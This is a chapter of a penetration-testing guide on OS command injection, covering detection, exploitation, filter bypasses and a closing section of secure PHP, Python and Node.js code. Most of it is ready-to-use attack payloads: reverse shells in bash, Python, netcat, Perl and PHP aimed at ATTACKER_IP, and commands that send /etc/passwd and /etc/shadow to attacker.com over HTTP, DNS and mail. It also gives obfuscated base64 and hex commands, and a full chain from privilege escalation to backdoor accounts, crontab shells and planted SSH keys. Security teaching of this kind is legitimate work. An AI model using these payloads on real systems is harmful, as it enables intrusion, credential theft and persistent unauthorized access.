# 11. OS COMMAND INJECTION <a name="command-injection"></a>

## 11.1 THEORY & BACKGROUND

### What is OS Command Injection?

**OS Command Injection** allows attackers to execute arbitrary operating system commands on the server.

**How it occurs:**
Application passes user input to system shell without proper sanitization.

**Example vulnerable code:**

```php
// PHP
$filename = $_GET['file'];
system("cat /var/www/uploads/" . $filename);

// Attack:
// ?file=test.txt; whoami
// Executes: cat /var/www/uploads/test.txt; whoami
```

**Common vulnerable functions:**

```bash
# PHP
system(), exec(), shell_exec(), passthru(), popen(), proc_open()
backticks: `command`

# Python
os.system(), os.popen(), subprocess.call(), subprocess.run()

# Node.js
child_process.exec(), child_process.spawn()

# Java
Runtime.getRuntime().exec()

# Ruby
system(), exec(), `command`, %x{command}
```

---

## 11.2 IDENTIFICATION

### 11.2.1 Finding Injection Points

**Common vulnerable parameters:**

```bash
# Filename operations
?file=document.pdf
?path=/var/www/uploads/file.txt
?template=default.html

# Network operations
?ip=192.168.1.1
?host=example.com
?url=http://example.com

# System operations
?backup=database.sql
?restore=backup.tar.gz
?convert=image.jpg
```

**Testing for vulnerability:**

```bash
# Basic test - Time delay
curl "http://site.com/ping?ip=127.0.0.1;sleep+5"
# If response delayed by 5 seconds → vulnerable!

# Boolean test
curl "http://site.com/ping?ip=127.0.0.1;whoami"
# Check response for command output

# Error-based detection
curl "http://site.com/ping?ip=127.0.0.1`"
# If error message → may be vulnerable
```

---

## 11.3 COMMAND INJECTION TECHNIQUES

### 11.3.1 Command Separators

**Unix/Linux:**

```bash
# Semicolon - sequential execution
; command

# Pipe - pass output to next command
| command

# AND - execute if previous succeeds
&& command

# OR - execute if previous fails
|| command

# Newline
%0a command

# Background execution
& command

# Subshell
`command`
$(command)
```

**Windows:**

```cmd
# Ampersand
& command

# Pipe
| command

# AND
&& command

# OR
|| command

# Newline
%0a command
```

**Examples:**

```bash
# Original command: ping -c 1 192.168.1.1

# Injections:
192.168.1.1; whoami
192.168.1.1 | whoami
192.168.1.1 && whoami
192.168.1.1 || whoami
192.168.1.1 `whoami`
192.168.1.1 $(whoami)
192.168.1.1%0awhoami
```

### 11.3.2 Blind Command Injection

**Time-based detection:**

```bash
# Sleep command
; sleep 10
| sleep 10
`sleep 10`

# Ping to localhost (delay)
; ping -c 10 127.0.0.1

# Windows
& timeout 10
| ping -n 10 127.0.0.1
```

**Out-of-band (OOB) detection:**

```bash
# DNS lookup to attacker's domain
; nslookup attacker.com
; dig attacker.com
`host attacker.com`

# HTTP request to attacker
; curl http://attacker.com/ping
; wget http://attacker.com/ping

# With unique identifier
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/`id`
```

**File-based verification:**

```bash
# Create marker file
; touch /tmp/pwned

# Then check if file exists via other feature:
http://site.com/view?file=/tmp/pwned
```

---

## 11.4 EXPLOITATION

### 11.4.1 Information Gathering

**Basic reconnaissance:**

```bash
# System information
; uname -a
; cat /etc/issue
; cat /etc/*-release

# Current user
; whoami
; id

# Network information
; ifconfig
; ip addr
; netstat -tulpn

# Process listing
; ps aux
; ps -ef

# File system
; ls -la /
; ls -la /home
; ls -la /var/www

# Environment
; env
; printenv

# Installed software
; which python
; which gcc
; which wget
; which curl
```

**Reading sensitive files:**

```bash
# Passwords
; cat /etc/passwd
; cat /etc/shadow

# SSH keys
; cat /root/.ssh/id_rsa
; cat /home/user/.ssh/id_rsa

# Configuration files
; cat /var/www/html/config.php
; cat /etc/apache2/apache2.conf
; cat /etc/mysql/my.cnf

# Logs
; cat /var/log/apache2/access.log
; cat /var/log/auth.log

# Application source
; cat /var/www/html/index.php
```

### 11.4.2 Reverse Shells

**Bash reverse shell:**

```bash
# Basic
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# URL encoded
;%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261

# Base64 encoded (bypass filters)
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash
```

**Python reverse shell:**

```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Netcat reverse shell:**

```bash
; nc -e /bin/bash ATTACKER_IP 4444

# If -e not available:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

**Perl reverse shell:**

```bash
; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**PHP reverse shell:**

```bash
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Listener on attacker machine:**

```bash
# Netcat listener
nc -lvnp 4444

# When victim connects:
# Upgrade to TTY shell:
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 11.4.3 Data Exfiltration

**Via HTTP:**

```bash
# Exfiltrate /etc/passwd
; curl -d @/etc/passwd http://attacker.com/receive

# Exfiltrate multiple files
; tar czf - /var/www/html | curl -X POST --data-binary @- http://attacker.com/receive

# Exfiltrate via GET (base64 encoded)
; curl "http://attacker.com/$(cat /etc/passwd | base64)"
```

**Via DNS:**

```bash
# Exfiltrate data in subdomain
; cat /etc/passwd | base64 | while read line; do dig $line.attacker.com; done

# Shorter version
; dig `cat /etc/passwd | base64`.attacker.com
```

**Via Email:**

```bash
# If mail command available
; cat /etc/shadow | mail -s "Data" attacker@evil.com
```

### 11.4.4 Privilege Escalation

**After initial access:**

```bash
# Check sudo permissions
; sudo -l

# SUID binaries
; find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
; ls -la /etc/passwd
# If writable:
; echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Kernel exploits
; uname -a
# Search exploit-db for version

# Cron jobs
; cat /etc/crontab
; ls -la /etc/cron.*

# Add to cron
; echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /etc/crontab
```

---

## 11.5 BYPASS TECHNIQUES

### 11.5.1 Space Filtering Bypass

**If spaces are filtered:**

```bash
# Use ${IFS} (Internal Field Separator)
;cat${IFS}/etc/passwd

# Tab character
;cat%09/etc/passwd

# Brace expansion
;{cat,/etc/passwd}

# Newline
;cat%0a/etc/passwd
```

### 11.5.2 Keyword Filtering Bypass

**Bypassing blacklisted commands:**

```bash
# If "cat" is blocked:

# Use other commands
;tac /etc/passwd      # Reverse cat
;head /etc/passwd
;tail /etc/passwd
;more /etc/passwd
;less /etc/passwd
;nl /etc/passwd       # Number lines

# Wildcard
;c?t /etc/passwd
;c*t /etc/passwd

# Variable expansion
;c$@at /etc/passwd

# Concatenation
;c'a't /etc/passwd
;c"a"t /etc/passwd
;ca\t /etc/passwd

# Base64 encode command
;echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# Decodes to: cat /etc/passwd

# Hex encoding
;echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
```

### 11.5.3 Character Encoding

**URL encoding:**

```bash
# Encode special characters
%3B = ;
%7C = |
%26 = &
%0A = newline

# Example:
%3Bwhoami
%7Cwhoami
```

**Unicode encoding:**

```bash
# Use unicode characters that normalize to ASCII
# Example: U+FF1B (full-width semicolon) → ;
```

### 11.5.4 Path Traversal in Commands

```bash
# If /bin/ is blocked:

# Use full path
;/usr/bin/whoami

# Relative path
;../../../bin/cat /etc/passwd

# Current directory
;./cat /etc/passwd  # If cat binary copied to current dir
```

---

## 11.6 REAL-WORLD EXPLOITATION EXAMPLE

**Complete Attack Chain:**

```bash
# 1. Identify injection point
# Found: http://site.com/ping?ip=TARGET

# 2. Test for vulnerability
curl "http://site.com/ping?ip=127.0.0.1;sleep+5"
# Response delayed → vulnerable!

# 3. Enumerate system
curl "http://site.com/ping?ip=127.0.0.1;uname+-a"
# Output: Linux webserver 4.15.0-45-generic x86_64 GNU/Linux

curl "http://site.com/ping?ip=127.0.0.1;whoami"
# Output: www-data

# 4. Check for sudo
curl "http://site.com/ping?ip=127.0.0.1;sudo+-l"
# Output: (ALL) NOPASSWD: /usr/bin/find

# 5. Privilege escalation payload
curl "http://site.com/ping?ip=127.0.0.1;sudo+find+.+-exec+/bin/bash+\;"

# 6. Not interactive, setup reverse shell
# Start listener on attacker:
nc -lvnp 4444

# 7. Trigger reverse shell
curl "http://site.com/ping?ip=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# 8. Receive shell as www-data
# 9. Privilege escalation
sudo find . -exec /bin/bash \;
# Now root!

# 10. Persistence
echo 'backdoor_user:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
mkdir /root/.ssh
echo 'ssh-rsa AAAAB3... attacker@kali' >> /root/.ssh/authorized_keys

# 11. Lateral movement
cat /home/*/.bash_history | grep -i ssh
# Find credentials for other servers
```

---

## 11.7 PREVENTION

**Secure code examples:**

```php
<?php
// VULNERABLE
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);

// SECURE - Input validation (allowlist)
$ip = $_GET['ip'];

// Validate IP format
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die('Invalid IP address');
}

// Use escapeshellarg (escapes special characters)
$safe_ip = escapeshellarg($ip);
system("ping -c 1 " . $safe_ip);

// BETTER - Don't use system commands
// Use native PHP functions instead
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // Use PHP's native ping equivalent or exec with extreme validation
}

// BEST - Avoid shell execution entirely
// Use language-specific libraries
$output = exec("ping", ["-c", "1", $validated_ip], $return_code);
?>
```

```python
# VULNERABLE
import os
filename = request.args.get('file')
os.system('cat /var/www/uploads/' + filename)

# SECURE - Use subprocess with list (no shell)
import subprocess
filename = request.args.get('file')

# Validate filename
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    return 'Invalid filename', 400

# Use list, not string (prevents shell injection)
result = subprocess.run(
    ['cat', '/var/www/uploads/' + filename],
    capture_output=True,
    text=True,
    timeout=5
)

# BEST - Use Python file operations
with open('/var/www/uploads/' + validated_filename, 'r') as f:
    content = f.read()
```

```javascript
// VULNERABLE
const { exec } = require('child_process');
const filename = req.query.file;
exec('cat /var/www/uploads/' + filename);

// SECURE - Use execFile (no shell interpretation)
const { execFile } = require('child_process');
const filename = req.query.file;

// Validate
if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
    return res.status(400).send('Invalid filename');
}

execFile('cat', ['/var/www/uploads/' + filename], (error, stdout) => {
    if (error) {
        return res.status(500).send('Error');
    }
    res.send(stdout);
});

// BEST - Use Node.js fs module
const fs = require('fs');
fs.readFile('/var/www/uploads/' + validated_filename, 'utf8', (err, data) => {
    if (err) return res.status(500).send('Error');
    res.send(data);
});
```

---